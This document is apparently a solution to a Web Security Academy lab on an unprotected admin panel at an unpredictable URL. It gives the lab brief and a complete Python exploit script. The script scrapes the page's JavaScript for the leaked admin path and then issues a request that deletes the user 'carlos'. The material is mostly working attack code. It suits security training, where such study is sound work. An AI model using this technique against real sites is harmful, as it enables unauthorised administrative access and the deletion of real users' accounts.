# Unprotected admin functionality with unpredictable URL

> This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.
> Solve the lab by accessing the admin panel, and using it to delete the user `carlos`.

```python
import requests
import re
from bs4 import BeautifulSoup

# Configuration
BASE_URL = "https://0a5600ec04c208868d1b779c009b003e.web-security-academy.net/"

def exploit_admin_panel(url):
    # Use a session to maintain connection state
    session = requests.Session()
    print(f"[*] Fetching page source: {url}")
    
    response = session.get(url)
 
    soup = BeautifulSoup(response.text, 'html.parser')
    scripts = soup.find_all('script')
    
    for script in scripts:
        # Identify the specific script block containing the admin logic
        if script.string and "adminPanelTag.setAttribute" in script.string:
            
            # Extract the path using regex (handles potential whitespace)
            match = re.search(r"setAttribute\('href',\s*'([^']+)'\)", script.string)
            
            if match:
                admin_path = match.group(1)
                print(f"[+] Admin Path Discovered: {admin_path}")
                
                # Construct the full admin URL
                # Ensure base URL has no trailing slash to avoid double slashes
                base_clean = url.rstrip('/')
                admin_url = f"{base_clean}{admin_path}"
                
                # Construct the delete endpoint
                delete_url = f"{admin_url}/delete?username=carlos"
                print(f"[*] Triggering deletion: {delete_url}")
                
                # Execute the deletion
                del_response = session.get(delete_url)
                
                if del_response.status_code == 200:
                    print("[+] SUCCESS: User deleted.")
                else:
                    print(f"[-] Failed to delete. Status: {del_response.status_code}")
                return

    print("[-] Admin path not found in source code.")

if __name__ == "__main__":
    exploit_admin_panel(BASE_URL)
```